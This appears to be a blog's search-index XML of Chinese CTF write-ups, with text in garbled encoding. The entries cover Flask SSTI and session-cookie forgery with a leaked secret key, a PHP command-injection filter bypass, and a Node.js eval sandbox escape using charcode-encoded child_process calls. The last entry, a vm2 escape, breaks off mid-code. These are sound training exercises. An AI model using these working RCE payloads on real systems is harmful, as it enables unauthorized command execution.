<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[watevrCTF-2019]Supercalc</title>
      <link href="/p/1429696811.html"/>
      <url>/p/1429696811.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[SSTI|flask sessionæ„é€ ]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914111100333.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>æ‰«äº†ä¸‹ç›®å½•ï¼Œæ²¡å•¥å‘ç°</p><p>è§£ä¸‹sessionï¼Œçœ‹æ¥æ˜¯flaskï¼Ÿ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914125031207.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914124026007.png"></p><p>æ‰“<code>&#123;&#123;1+1&#125;&#125;</code>æç¤º</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914124215231.png"></p><p>è¾“å…¥<code>1/0#&#123;&#123;1+1&#125;&#125;</code>èƒ½æ‹¿åˆ°ç»“æœã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914124259336.png"></p><p>è¾“å…¥<code>1/0#&#123;&#123;7*7&#125;&#125;</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914124443114.png"></p><p>è¯•äº†ä¸€äº›RCEä»£ç ï¼Œä¸å¤ªè¡Œï¼Œåº”è¯¥æœ‰è¿‡æ»¤ã€‚</p><p>æ‰€ä»¥å…ˆçœ‹çœ‹<code>&#123;&#123;config&#125;&#125;</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914124937130.png"></p><p>è½¬ä¸ªç </p><pre class="line-numbers language-none"><code class="language-none">&lt;Config &#123;&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;cded826a1e89925035cc05f0907855f7&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;&#x2F;&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application&#x2F;json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093&#125;&gt;ZeroDivisionError: division by zero<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å…¶ä¸­<code>&#39;SECRET_KEY&#39;: &#39;cded826a1e89925035cc05f0907855f7&#39;</code></p><p>ç„¶åæ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼Œä¼ªé€ session-&gt;æœåŠ¡ç«¯è¯»å–-&gt;æ‰§è¡Œä»£ç ï¼Œè¿™æ ·å°±èƒ½ç»•è¿‡è¿‡æ»¤ã€‚</p><p>ç”¨è¿™ä¸ªè„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterfacesecret_key <span class="token operator">=</span> <span class="token string">"cded826a1e89925035cc05f0907855f7"</span><span class="token keyword">class</span> <span class="token class-name">FakeApp</span><span class="token punctuation">:</span>    secret_key <span class="token operator">=</span> secret_keyfake_app <span class="token operator">=</span> FakeApp<span class="token punctuation">(</span><span class="token punctuation">)</span>session_interface <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>serializer <span class="token operator">=</span> session_interface<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>fake_app<span class="token punctuation">)</span>cookie <span class="token operator">=</span> serializer<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>    <span class="token punctuation">&#123;</span><span class="token string">"history"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token string">'__import__("os").popen("ls ").read()'</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ–è€…æ˜¯<code>flask-session-cookie-manager</code></p><p>è¿™è¿˜å¾—åŠ è½¬ä¹‰ï¼Œè¿™ä¹ˆçœ‹è¿˜æ˜¯ä¸Šé¢é‚£ä¸ªè„šæœ¬æ–¹ä¾¿ç‚¹ã€‚</p><pre class="line-numbers language-none"><code class="language-none">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#39;history&#39;: [&#123;&#39;code&#39;:&#39;__import__(\&quot;os\&quot;).popen(\&quot;ls \&quot;).read()&#39;&#125;]&#125;&quot; -s &quot;cded826a1e89925035cc05f0907855f7&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914125955481.png"></p><p>æ”¹ä¸‹å‘½ä»¤ï¼Œè¯»å–ï¼Œç»“æŸ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-watevrCTF-2019-Supercalc/image-20210914130639837.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:EasyBypass</title>
      <link href="/p/2826789871.html"/>
      <url>/p/2826789871.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[systemç»•è¿‡]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$comm1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comm1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$comm2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comm2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\'|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span><span class="token punctuation">,</span> <span class="token variable">$comm1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$comm1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is"</span><span class="token punctuation">,</span> <span class="token variable">$comm2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$comm2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"#flag in /flag"</span><span class="token punctuation">;</span><span class="token variable">$comm1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$comm1</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$comm2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$comm2</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"file <span class="token interpolation"><span class="token variable">$comm1</span></span> <span class="token interpolation"><span class="token variable">$comm2</span></span>"</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><pre class="line-numbers language-none"><code class="language-none">?comm1&#x3D;index.php&quot;;tac &#x2F;fla?&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[NPUCTF2020]éªŒè¯ğŸ</title>
      <link href="/p/3947461522.html"/>
      <url>/p/3947461522.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[éªŒè¯ç |JavaScript|æ— å­—æ¯æ•°å­—|jså¼±ç±»å‹]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E/image-20210913104308943.png"></p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">const express &#x3D; require(&#39;express&#39;);const bodyParser &#x3D; require(&#39;body-parser&#39;);const cookieSession &#x3D; require(&#39;cookie-session&#39;);const fs &#x3D; require(&#39;fs&#39;);const crypto &#x3D; require(&#39;crypto&#39;);const keys &#x3D; require(&#39;.&#x2F;key.js&#39;).keys;function md5(s) &#123;  return crypto.createHash(&#39;md5&#39;)    .update(s)    .digest(&#39;hex&#39;);&#125;function saferEval(str) &#123;  if (str.replace(&#x2F;(?:Math(?:\.\w+)?)|[()+\-*&#x2F;&amp;|^%&lt;&gt;&#x3D;,?:]|(?:\d+\.?\d*(?:e\d+)?)| &#x2F;g, &#39;&#39;)) &#123;    return null;  &#125;  return eval(str);&#125; &#x2F;&#x2F; 2020.4&#x2F;WORKER1 æ·¦ï¼Œä¸Šæ¬¡çš„åº“å¤ªåƒåœ¾ï¼Œæˆ‘è‡ªå·±å†™äº†ä¸€ä¸ªconst template &#x3D; fs.readFileSync(&#39;.&#x2F;index.html&#39;).toString();function render(results) &#123;  return template.replace(&#39;&#123;&#123;results&#125;&#125;&#39;, results.join(&#39;&lt;br&#x2F;&gt;&#39;));&#125;const app &#x3D; express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());app.use(cookieSession(&#123;  name: &#39;PHPSESSION&#39;, &#x2F;&#x2F; 2020.3&#x2F;WORKER2 å˜¿å˜¿ï¼Œç»™ğŸ‘´çˆªâ‘§  keys&#125;));Object.freeze(Object);Object.freeze(Math);app.post(&#39;&#x2F;&#39;, function (req, res) &#123;  let result &#x3D; &#39;&#39;;  const results &#x3D; req.session.results || [];  const &#123; e, first, second &#125; &#x3D; req.body;  if (first &amp;&amp; second &amp;&amp; first.length &#x3D;&#x3D;&#x3D; second.length &amp;&amp; first!&#x3D;&#x3D;second &amp;&amp; md5(first+keys[0]) &#x3D;&#x3D;&#x3D; md5(second+keys[0])) &#123;    if (req.body.e) &#123;      try &#123;        result &#x3D; saferEval(req.body.e) || &#39;Wrong Wrong Wrong!!!&#39;;      &#125; catch (e) &#123;        console.log(e);        result &#x3D; &#39;Wrong Wrong Wrong!!!&#39;;      &#125;      results.unshift(&#96;$&#123;req.body.e&#125;&#x3D;$&#123;result&#125;&#96;);    &#125;  &#125; else &#123;    results.unshift(&#39;Not verified!&#39;);  &#125;  if (results.length &gt; 13) &#123;    results.pop();  &#125;  req.session.results &#x3D; results;  res.send(render(req.session.results));&#125;);&#x2F;&#x2F; 2019.10&#x2F;WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPIapp.get(&#39;&#x2F;source&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text&#x2F;javascript;charset&#x3D;utf-8&#39;);  res.send(fs.readFileSync(&#39;.&#x2F;index.js&#39;));&#125;);app.get(&#39;&#x2F;&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text&#x2F;html;charset&#x3D;utf-8&#39;);  req.session.admin &#x3D; req.session.admin || 0;  res.send(render(req.session.results &#x3D; req.session.results || []))&#125;);app.listen(80, &#39;0.0.0.0&#39;, () &#x3D;&gt; &#123;  console.log(&#39;Start listening&#39;)&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>æ˜¾ç„¶ï¼Œç»•è¿‡è¿‡æ»¤å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E/image-20210913104458507.png"></p><blockquote><p>?:è¡¨ç¤ºä¸æ•è·åˆ†ç»„</p></blockquote><p>å–<code>Function</code>å­—æ ·</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E/image-20210913131303033.png"></p><p>ç„¶åå°±å¯ä»¥è¿™æ ·æ‰§è¡Œjsä»£ç ã€‚</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">let a&#x3D;Math.constructor.constructorconsole.log(a(&quot;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;dir&#39;).toString()&quot;)())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä½†è¿™é‡Œåªå…è®¸æ•°å­—ä¸å…è®¸å­—ç¬¦ä¸²ï¼Œå¯ä»¥åˆ©ç”¨<code>String.fromCharCode()</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"return process.mainModule.require('child_process').execSync('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cmd<span class="token punctuation">&#125;</span></span><span class="token string">').toString()"</span></span>    <span class="token keyword">return</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>gen<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶ååˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥å‡‘å‡º<code>String</code></p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">Math+1 &#x2F;&#x2F;&quot;[object Math]1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å†åˆ©ç”¨ç®­å¤´å‡½æ•°è‡ªè°ƒç”¨<code>(()=&gt;())()</code></p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">let a &#x3D; function () &#123;    console.log(&quot;123123&quot;);&#125;;a();let b &#x3D; (x) &#x3D;&gt; &#123;    console.log(x);&#125;;b(123);let c &#x3D; (x) &#x3D;&gt; console.log(x);c(123);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token parameter">Math</span><span class="token operator">=></span><span class="token punctuation">(</span>Math<span class="token operator">=</span><span class="token class-name">Math</span><span class="token punctuation">.</span>constructor<span class="token punctuation">,</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>Math<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¾åŒ–ä¸€ä¸‹</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">(Math&#x3D;&gt;    (Math&#x3D;Math.constructor,            Math.constructor(                Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,                    99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,                    46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,                    95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,                    121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()    ))(Math+1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶å®å°±æ˜¯è¿™æ ·ï¼Œ<code>Math+1</code>æ˜¯ä¼ å…¥çš„å‚æ•°</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">(x&#x3D;&gt;    (x&#x3D;x.constructor,          x.constructor(               x.fromCharCode(114,101,116,117,114,110,32,112,114,111,                    99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,                    46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,                    95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,                    121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()    ))(Math+1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="jså¼±ç±»å‹"><a href="#jså¼±ç±»å‹" class="headerlink" title="jså¼±ç±»å‹"></a>jså¼±ç±»å‹</h3><p>åœ¨è¿™éœ€è¦è¿›è¡Œç»•è¿‡</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E/image-20210913105338214.png"></p><p>å¯ä»¥åˆ©ç”¨jsçš„å¼±ç±»å‹</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">[1]+&#39;1&#39; &#x2F;&#x2F;&#39;11&#39;&#39;1&#39;+&#39;1&#39; &#x2F;&#x2F;&#39;11&#39;[1]!&#x3D;&#x3D;&#39;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œéœ€è¦ç”¨jsonä¼ ï¼Œåº”è¯¥æ˜¯ä¿è¯ä¸€ä¸ªæ˜¯æ•°ç»„ä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E/image-20210913134311240.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> jsonheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">&#125;</span>url <span class="token operator">=</span> <span class="token string">"http://18ba1e8e-c273-45f3-bd2b-a2b05a922885.node4.buuoj.cn:81/"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"e"</span><span class="token punctuation">:</span> <span class="token string">"2-1"</span><span class="token punctuation">,</span> <span class="token string">"first"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"second"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E/image-20210913134604844.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[HITCON 2016]Leaking</title>
      <link href="/p/325534609.html"/>
      <url>/p/325534609.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[nodejs|æ²™ç®±é€ƒé€¸]</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">&quot;use strict&quot;;var randomstring &#x3D; require(&quot;randomstring&quot;);var express &#x3D; require(&quot;express&quot;);var &#123;    VM&#125; &#x3D; require(&quot;vm2&quot;);var fs &#x3D; require(&quot;fs&quot;);var app &#x3D; express();var flag &#x3D; require(&quot;.&#x2F;config.js&quot;).flagapp.get(&quot;&#x2F;&quot;, function(req, res) &#123;    res.header(&quot;Content-Type&quot;, &quot;text&#x2F;plain&quot;);    &#x2F;*    Orange is so kind so he put the flag here. But if you can guess correctly :P    *&#x2F;    eval(&quot;var flag_&quot; + randomstring.generate(64) + &quot; &#x3D; \&quot;hitcon&#123;&quot; + flag + &quot;&#125;\&quot;;&quot;)    if (req.query.data &amp;&amp; req.query.data.length &lt;&#x3D; 12) &#123;        var vm &#x3D; new VM(&#123;            timeout: 1000        